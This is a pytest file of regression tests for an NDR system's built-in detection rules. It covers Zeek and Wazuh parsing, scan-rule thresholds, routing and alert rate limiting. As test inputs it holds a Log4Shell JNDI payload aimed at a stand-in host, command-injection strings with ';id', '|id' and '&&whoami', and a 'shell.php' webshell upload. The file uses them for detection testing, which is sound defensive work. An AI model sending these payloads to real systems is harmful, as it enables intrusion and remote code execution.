"""内置规则质量回归（2026-10 规则评审的 P0/P1/P2）。

每个用例对应评审报告（`docs/ndr-rules-quality-report.md`）里的一条结论，钉住：

- 结构守卫：`_FIELD_TYPES` 无僵尸键、规则不引用不存在的字段、路由合并后按全局
  priority 排序、引擎空条件不再静默命中；
- 字段生产：Zeek 链路 `cookie`/`content_type` 从头文本解析、`weird.log` 能产出
  `protocol_anomaly`/`tls_anomaly`、x509 自签判定；
- 规则内容：Log4Shell 词边界、命令注入分隔符、WebShell 上传判据、恒真条件；
- 交付侧：单规则限速 + 严重度优先。

两侧（NDR / agent）都跑，只有检测器交付侧用例仅 NDR。
"""

from __future__ import annotations

import importlib
import re
from typing import Any

import pytest
import samples

_HTTP = samples.HTTP
_CONN = samples.CONN


@pytest.fixture(scope="module")
def mods(request: pytest.FixtureRequest) -> dict[str, Any]:
    if request.config.getoption("--stack") not in ("ndr", "agent"):
        pytest.skip("只跑两个已知栈")
    return {
        "engine": importlib.import_module("app.rules.engine"),
        "builtin": importlib.import_module("app.rules.builtin"),
        "normalizer": importlib.import_module("app.ingestion.normalizer"),
        "schemas": importlib.import_module("app.schemas"),
        "config": importlib.import_module("app.config"),
    }


def _by_name(rules: list[dict[str, Any]], name: str) -> dict[str, Any]:
    return next(r for r in rules if r["name"] == name)


def _entry(mods: dict[str, Any], fields: dict[str, Any], log_type: str) -> Any:
    doc = samples.envelope(fields, log_type, f"/logs/{log_type}.log")
    entry = mods["normalizer"].normalize_zeek(doc)
    assert entry is not None
    return entry


def _rule_fields(cond: Any, out: set[str]) -> None:
    """收集条件树里引用的字段名（含 distinct 与 key）。"""
    if isinstance(cond, dict):
        if isinstance(cond.get("field"), str):
            out.add(cond["field"])
        if isinstance(cond.get("distinct"), str) and cond["distinct"]:
            out.add(cond["distinct"])
        for key in cond.get("key") or []:
            out.add(str(key))
        for value in cond.values():
            _rule_fields(value, out)
    elif isinstance(cond, list):
        for item in cond:
            _rule_fields(item, out)


# ---------- 结构守卫 ----------


def test_field_types_has_no_zombie_keys(mods: dict[str, Any]) -> None:
    """`_FIELD_TYPES` 的键必须都是 UnifiedLog 真字段（否则是永远不生效的僵尸键）。"""
    fields = set(mods["schemas"].UnifiedLog.model_fields)
    zombies = sorted(k for k in mods["engine"]._FIELD_TYPES if k not in fields)
    assert zombies == [], f"僵尸键：{zombies}"


def test_every_rule_field_exists(mods: dict[str, Any]) -> None:
    """规则引用的字段必须存在（写错字段名会静默永不命中）。"""
    known = set(mods["schemas"].UnifiedLog.model_fields) | set(mods["engine"].VIRTUAL_FIELDS)
    bad: list[str] = []
    for rule in mods["builtin"].BUILTIN_RULES:
        used: set[str] = set()
        _rule_fields(rule["conditions"], used)
        bad += [f"{rule['name']} → {f}" for f in sorted(used) if f not in known]
    assert bad == []


def test_every_rule_regex_compiles(mods: dict[str, Any]) -> None:
    bad = [
        (r["name"], mods["engine"].validate_rule_regexes(r)) for r in mods["builtin"].BUILTIN_RULES
    ]
    assert [b for b in bad if b[1]] == []


def test_routing_is_globally_priority_sorted(mods: dict[str, Any]) -> None:
    """候选规则必须按全局 priority 排序：原来是 `types + wild` 拼接，通配的 p5 会被专有的 p25 遮蔽。"""
    typed = {
        "name": "t-typed",
        "priority": 25,
        "conditions": {"rules": [{"field": "uri_path", "op": "eq", "value": "/x"}]},
    }
    wild = {
        "name": "t-wild",
        "priority": 5,
        "conditions": {"rules": [{"field": "src_ip", "op": "exists"}]},
    }
    index = mods["engine"].build_rule_index([wild, typed])
    assert [r["name"] for r in mods["engine"].rules_for_log_type(index, "http")] == [
        "t-wild",
        "t-typed",
    ]


def test_match_hardening(mods: dict[str, Any]) -> None:
    """空条件 / 缺字段名 / 缺值不再静默命中；`ne` 对空值不再恒真。"""
    engine = mods["engine"]
    entry = _entry(mods, {**_CONN, "id.resp_p": 443}, "conn")
    assert engine._match({}, entry) is False
    assert engine._match({"op": "eq", "value": "x"}, entry) is False
    assert engine._match({"field": "dst_port", "op": "eq"}, entry) is False
    # 空值上的 `ne` 曾经恒真 → 把「没带认证头」当成「不是 Basic 认证」放行
    assert engine._match({"field": "auth_scheme", "op": "ne", "value": "basic"}, entry) is False
    # exists：空串算不存在，布尔值 False 算存在（`file_is_orig` 的 False 是有效取值）
    assert engine._match({"field": "user_agent", "op": "exists"}, entry) is False
    assert (
        engine._match(
            {"field": "file_is_orig", "op": "exists"},
            _entry(mods, {**samples.HTTP, "is_orig": False}, "files"),
        )
        is True
    )


# ---------- 字段生产 ----------


def test_cookie_and_content_type_from_headers(mods: dict[str, Any]) -> None:
    """Zeek 的 http.log 没有 cookie/content-type 列，必须从头文本里解出来。"""
    entry = _entry(
        mods,
        {
            **_HTTP,
            "req_headers": "COOKIE: JSESSIONID=abc123\nCONTENT-TYPE: multipart/form-data",
        },
        "http",
    )
    assert entry.cookie == "JSESSIONID=abc123"
    assert entry.content_type == "multipart/form-data"


def test_weird_maps_to_protocol_and_tls_anomaly(mods: dict[str, Any]) -> None:
    """采集面关掉了 notice：protocol_anomaly / tls_anomaly 只能从 weird.log 的名字出。"""
    assert _entry(mods, {**samples.WEIRD, "name": "bad_HTTP_header"}, "weird").event_type == (
        "protocol_anomaly"
    )
    for name in ("ssl_invalid_server_certificate", "tls_unknown_cipher"):
        assert _entry(mods, {**samples.WEIRD, "name": name}, "weird").event_type == "tls_anomaly"


def test_capture_weird_maps_to_capture_anomaly(mods: dict[str, Any]) -> None:
    """采集类异常单列一类：不进「协议异常」规则，只做采集质量的健康指标。

    2026-10 实机实测：`possible_split_routing` / `data_before_established` / `truncated_tcp_payload`
    这类（镜像口丢包 / 非对称路由 / 网卡 offload）占全部 weird 的 ~87%，一刀切命中
    「协议异常」会让一个 5 分钟窗口产出 75~84 条摘要（约占全部摘要一半）。
    它们仍是采集质量的信号（丢包=漏检），所以只换分类、**数据一条不丢**。
    """
    for name in (
        "possible_split_routing",
        "data_before_established",
        "truncated_tcp_payload",
        "SYN_inside_connection",
        "window_recision",
        "data_after_reset",
        "inappropriate_FIN",
    ):
        entry = _entry(mods, {**samples.WEIRD, "name": name}, "weird")
        assert entry.event_type == "capture_anomaly", name
        assert entry.weird_name == name
    # 大小写不敏感（Zeek 自己就是 SYN_inside_connection 这种混合写法）
    assert (
        _entry(mods, {**samples.WEIRD, "name": "POSSIBLE_SPLIT_ROUTING"}, "weird").event_type
        == "capture_anomaly"
    )
    # 异常名只属于 weird 日志（其它类型恒空，改名不会串到别处）
    assert _entry(mods, samples.CONN, "conn").weird_name == ""


def test_fast_port_scan_rule_is_fanout_gated(mods: dict[str, Any]) -> None:
    """「内置-快速端口扫描」必须按**扇出**判定，且只认未建立的失败尝试。

    2026-10 实机实测：原「内置-扫描尝试连接」（单次 S0 就告警）误报率 ≈ 100% —— 近 15 分钟
    9,165 条 S0 / 92 个源里，不同目的端口最多的源只有 **3 个**。改成扇出后：≥10 次失败
    且≥8 个不同目的端口才算扫描（实测正常重试的端口扇出 ≤3，有 ~2.6× 余量）。
    """
    rule = _by_name(mods["builtin"].BUILTIN_RULES, "内置-快速端口扫描")
    cond = rule["conditions"]
    assert cond["mode"] == "count"
    assert cond["key"] == ["src_ip"]
    assert cond["window"] == 300
    assert cond["min_count"] >= 10
    assert cond["distinct"] == "dst_port"
    assert cond["min_distinct"] >= 8
    assert rule["severity"] == "medium"
    fields = {r["field"]: r for r in cond["rules"]}
    assert fields["log_type"]["value"] == "conn"
    # 同时认「无回应」与「RST 回应」；不含已建立后的 RST（RSTO/RSTR 是正常业务断连）
    assert set(fields["event_type"]["value"]) == {"scan_attempt", "rejected_connection"}


def test_retired_scan_rule_is_gone_and_marked(mods: dict[str, Any]) -> None:
    """退役的「内置-扫描尝试连接」不能再回到规则表，且必须在 RETIRED_RULES 里备案。"""
    names = {r["name"] for r in mods["builtin"].BUILTIN_RULES}
    assert "内置-扫描尝试连接" not in names
    retired = mods["builtin"].RETIRED_RULES
    assert "内置-扫描尝试连接" in retired
    assert "已停用" in retired["内置-扫描尝试连接"]
    # 接手它的扇出型规则必须都在
    for name in ("内置-快速端口扫描", "内置-高频扫描连接", "内置-内网慢速服务枚举"):
        assert name in names, name


def test_deleted_notice_rule_is_gone_and_marked(mods: dict[str, Any]) -> None:
    """notice 型死规则「内置-端口扫描」必须从规则表移除，并在 DELETED_RULES 备案。

    2026-10 实机数据：库里 8 条 `event_type=port_scan` 全是 Wazuh 的 CIS 合规告警
    （"Ensure 'Turn on e-mail scanning'…"），不是扫描；采集面又已关掉 Zeek 自带 notice →
    这条规则没有任何有效命中路径。
    """
    builtin_mod = mods["builtin"]
    names = {r["name"] for r in builtin_mod.BUILTIN_RULES}
    assert "内置-端口扫描" not in names
    assert "内置-端口扫描" in builtin_mod.DELETED_RULES
    # 明文凭证传输（2026-10 用户口径）同样删除：校园 App 正常登录逐次报，属配置事实不是攻击事件
    assert "内置-明文凭证传输(HTTP登录)" not in names
    assert "内置-明文凭证传输(HTTP登录)" in builtin_mod.DELETED_RULES


def test_session_rule_keys_on_session_id(mods: dict[str, Any]) -> None:
    """「会话跨IP复用」必须按 `session_id` 判（而不是整条 Cookie 头）。

    2026-10 实测：用整条 Cookie 头当键时，跨用户恒定的值（`Path=/` 应用造的常量 cookie、
    `EPORTAL_COOKIE_PASSWORD=` 空值模板）会让它产出 337 条 critical 摘要而零真命中。
    """
    rule = _by_name(mods["builtin"].BUILTIN_RULES, "内置-会话跨IP复用")
    cond = rule["conditions"]
    assert cond["mode"] == "count"
    assert cond["key"] == ["session_id"]
    assert cond["distinct"] == "src_ip" and cond["min_distinct"] == 2
    assert cond["rules"] == [
        {"field": "session_id", "op": "exists"},
        {"field": "log_type", "op": "eq", "value": "http"},
    ]


def test_delete_builtin_rules_is_idempotent() -> None:
    """删除步骤：有行就删、没行不动（幂等，每次启动都跑）。"""
    import importlib
    from types import SimpleNamespace

    main_mod = importlib.import_module("app.main")

    class _Session:
        def __init__(self, row: Any) -> None:
            self.row = row
            self.deleted: list[Any] = []

        def execute(self, _stmt: Any) -> Any:
            return SimpleNamespace(scalar_one_or_none=lambda: self.row)

        def delete(self, row: Any) -> None:
            # 模拟真实库：删过之后按名就查不到了（DELETED_RULES 可能有多条，不能重复删同一行）
            self.deleted.append(row)
            self.row = None

        def flush(self) -> None:
            return None

    row = SimpleNamespace(name="内置-端口扫描")
    first = _Session(row)
    main_mod._delete_builtin_rules(first)
    assert first.deleted == [row]
    second = _Session(None)
    main_mod._delete_builtin_rules(second)
    assert second.deleted == []


def test_retire_builtin_rules_is_idempotent() -> None:
    """退役步骤幂等：首跑置停用 + 记说明；再跑不动它（不把用户后来打开的开关按回去）。"""
    import importlib
    from types import SimpleNamespace

    main_mod = importlib.import_module("app.main")

    class _Session:
        def __init__(self, row: Any) -> None:
            self.row = row
            self.flushed = False

        def execute(self, _stmt: Any) -> Any:
            return SimpleNamespace(scalar_one_or_none=lambda: self.row)

        def flush(self) -> None:
            self.flushed = True

    row = SimpleNamespace(name="内置-扫描尝试连接", enabled=True, description="原描述")
    main_mod._retire_builtin_rules(_Session(row))
    assert row.enabled is False
    assert "已停用" in row.description and "原描述" in row.description
    before = row.description
    main_mod._retire_builtin_rules(_Session(row))
    assert row.description == before


def test_cert_self_signed_from_nested_x509(mods: dict[str, Any]) -> None:
    """x509 的签发者嵌套在 certificate.issuer 下；subject == issuer 判自签。"""
    doc = samples.envelope(samples.X509, "x509", "/logs/x509.log")
    entry = mods["normalizer"].normalize_zeek(doc)
    assert entry is not None
    issuer = entry.cert_issuer
    assert issuer, "cert_issuer 不应为空（原来只取顶层 issuer → 恒空）"
    cert = samples.X509["certificate"]
    assert entry.cert_self_signed is (cert["issuer"] == cert["subject"])


def test_sshd_group_no_longer_means_brute_force(mods: dict[str, Any]) -> None:
    """Wazuh 的 sshd 组同时覆盖成功登录：不能据此判 brute_force。"""
    fn = mods["normalizer"]._wazuh_event_type
    assert fn(10, "sshd,authentication_success", "Accepted password for root") != "brute_force"
    assert fn(10, "authentication_failed,sshd", "Failed password for root") == "brute_force"


def test_login_path_regex_covers_common_forms(mods: dict[str, Any]) -> None:
    pattern = mods["config"].settings.web_login_path_regex
    for path in (
        "/login.php",
        "/wp-login.php",
        "/admin/login.do",
        "/api/v2/authenticate",
        "/user/sign_in",
    ):
        assert re.search(pattern, path), path
    for path in ("/mylogin", "/static/app.js"):
        assert not re.search(pattern, path), path


# ---------- 规则内容 ----------


def test_log4shell_word_boundary_and_header_vector(mods: dict[str, Any]) -> None:
    rule = _by_name(mods["builtin"].BUILTIN_RULES, "内置-表达式注入与JNDI(Log4Shell)")
    # 无词边界时 `/api/spellcheck` 会报 critical
    assert (
        mods["engine"].match_rule(rule, _entry(mods, {**_HTTP, "uri": "/api/spellcheck"}, "http"))
        is False
    )
    # CVE-2021-44228 的头注入向量（Zeek 的头值只在 req_headers 里）
    hit = _entry(mods, {**_HTTP, "req_headers": "USER-AGENT: ${jndi:ldap://evil/x}"}, "http")
    assert mods["engine"].match_rule(rule, hit) is True


def test_command_injection_without_trailing_space(mods: dict[str, Any]) -> None:
    rule = _by_name(mods["builtin"].BUILTIN_RULES, "内置-命令注入特征")
    for payload in ("/x?a=1;id", "/x?a=1|id", "/x?a=1&&whoami"):
        assert mods["engine"].match_rule(rule, _entry(mods, {**_HTTP, "uri": payload}, "http")), (
            payload
        )
    assert (
        mods["engine"].match_rule(rule, _entry(mods, {**_HTTP, "uri": "/x?a=1"}, "http")) is False
    )


def test_webshell_upload_requires_an_actual_upload(mods: dict[str, Any]) -> None:
    """判据是「上传了脚本文件」，不是「请求路径以 .php 结尾」。"""
    rule = _by_name(mods["builtin"].BUILTIN_RULES, "内置-WebShell上传")
    normal_form = _entry(
        mods, {**_HTTP, "uri": "/login.php", "method": "POST", "status_code": 302}, "http"
    )
    assert mods["engine"].match_rule(rule, normal_form) is False
    upload = _entry(
        mods,
        {
            **_HTTP,
            "uri": "/api/upload",
            "method": "POST",
            "status_code": 200,
            "content_type": "multipart/form-data; boundary=x",
            "body": 'Content-Disposition: form-data; name="f"; filename="shell.php"',
        },
        "http",
    )
    assert mods["engine"].match_rule(rule, upload) is True


def test_no_always_true_rule_conditions(mods: dict[str, Any]) -> None:
    """`src_ip exists` 之类恒真条件等于「无条件按源计数」，是最典型的 FP 洪泛源。"""
    big = _by_name(mods["builtin"].BUILTIN_RULES, "内置-大面积目标探测")
    assert {"field": "src_ip", "op": "exists"} not in big["conditions"]["rules"]
    assert big["conditions"]["rules"], "必须有真实判据"


@pytest.mark.parametrize(
    ("log_type", "fields"),
    [
        (
            "conn",
            {**_CONN, "id.resp_p": 443, "conn_state": "SF", "orig_bytes": 1200, "resp_bytes": 3400},
        ),
        ("http", {**_HTTP, "uri": "/index.html", "method": "GET", "status_code": 200}),
    ],
)
def test_boring_traffic_matches_no_per_event_rule(
    mods: dict[str, Any], log_type: str, fields: dict[str, Any]
) -> None:
    """最普通的正常流量不应命中任何逐条规则（恒真/过宽条件的护栏）。"""
    entry = _entry(mods, fields, log_type)
    hits = [
        r["name"]
        for r in mods["builtin"].BUILTIN_RULES
        if (r["conditions"] or {}).get("mode") != "count" and mods["engine"].match_rule(r, entry)
    ]
    assert hits == []


def test_wazuh_rules_are_routed_to_wazuh(mods: dict[str, Any]) -> None:
    """只引用通用字段的 Wazuh 规则必须显式挂 log_type=wazuh，否则退化成通配（每条日志都跑）。"""
    index = mods["engine"].build_rule_index(
        [r for r in mods["builtin"].BUILTIN_RULES if (r["conditions"] or {}).get("mode") != "count"]
    )
    wild = {r["name"] for r in index["wild"]}
    for name in ("内置-主机高危告警", "内置-主机文件完整性变更", "内置-主机策略违规"):
        assert name not in wild, f"{name} 还在通配集合里"


# ---------- 界面文案：规则名/描述不得出现厂商字样 ----------


def test_builtin_rule_text_has_no_vendor_words(mods: dict[str, Any]) -> None:
    """规则名与描述都会显示在管理界面上，不得出现 Zeek / Wazuh 字样（2026-10 界面口径）。

    只查**显示的散文**（name/description）；条件里的 `log_type eq wazuh`、
    `event_type eq wazuh_high_alert` 是内部枚举值（已落 1200 万+ 文档），不在此列。
    """
    bad: list[str] = []
    for rule in mods["builtin"].BUILTIN_RULES:
        text = f"{rule['name']} {rule.get('description') or ''}"
        if "Zeek" in text or "Wazuh" in text:
            bad.append(rule["name"])
    assert bad == []


def test_renamed_builtins_mapping_matches_rules(mods: dict[str, Any]) -> None:
    """改名映射必须「旧名已不在、新名确实在」：否则旧库改名会白跑或改到不存在的规则。

    规则名是 upsert 的键，改名不迁移就会新旧两行并存（旧行还带着用户的启用状态）。
    """
    main = importlib.import_module("app.main")
    names = {r["name"] for r in mods["builtin"].BUILTIN_RULES}
    mapping = main._RENAMED_BUILTINS
    assert mapping, "改名映射不该为空（界面口径已改成网络采集器 / 主机监控）"
    for old, new in mapping.items():
        assert old not in names, f"旧名 {old} 还在内置规则里（没改干净）"
        assert new in names, f"新名 {new} 不在内置规则里（映射写错）"


# ---------- 交付侧：单规则限速 + 严重度优先（仅 NDR） ----------


def test_rule_cap_and_severity_order(request: pytest.FixtureRequest) -> None:
    if request.config.getoption("--stack") != "ndr":
        pytest.skip("检测器交付侧只存在于 NDR")
    runner = importlib.import_module("app.detector.runner")

    class _Fake:
        def __init__(self) -> None:
            self.n: dict[str, int] = {}
            self.hashes: dict[str, dict[str, str]] = {}

        def incr(self, key: str) -> int:
            self.n[key] = self.n.get(key, 0) + 1
            return self.n[key]

        def expire(self, key: str, seconds: int) -> bool:
            return True

        def hincrby(self, key: str, field: str, amount: int = 1) -> int:
            h = self.hashes.setdefault(key, {})
            h[field] = str(int(h.get(field, 0)) + amount)
            return int(h[field])

        def hset(self, key: str, field: str, value: Any) -> int:
            self.hashes.setdefault(key, {})[field] = str(value)
            return 1

    client = _Fake()
    stats: Any = __import__("collections").Counter()
    cap = runner.settings.detector_max_digests_per_rule_minute
    items = [(f"p{i}", {"rule": "噪声规则", "rule_severity": "medium"}) for i in range(cap + 3)] + [
        ("hi", {"rule": "勒索", "rule_severity": "critical"})
    ]
    kept, dropped = runner._cap_per_rule(client, items, stats)
    assert len(dropped) == 3
    assert stats["dropped_rule_capped"] == 3
    # 高价值摘要不受同一规则噪声的影响，且排序时排在前面
    assert ("hi", {"rule": "勒索", "rule_severity": "critical"}) in kept
    kept.sort(key=lambda item: runner._severity_rank(item[1]), reverse=True)
    assert kept[0][0] == "hi"
